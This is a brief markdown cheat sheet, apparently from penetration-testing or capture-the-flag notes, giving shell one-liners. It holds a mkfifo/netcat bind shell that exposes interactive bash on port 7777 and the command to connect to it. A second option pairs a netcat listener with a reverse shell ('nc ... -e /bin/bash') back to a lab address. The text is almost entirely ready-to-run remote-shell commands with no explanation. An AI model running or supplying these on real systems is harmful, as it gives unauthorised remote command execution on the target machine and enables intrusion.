#shell/bind
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

```shell
nc -nv 10.129.41.200 7777

Target@server:~$  
```


## option 2

```bash
nc -nvlp 4444
```

```bash
nc 10.10.14.97 4444 -e /bin/bash
```
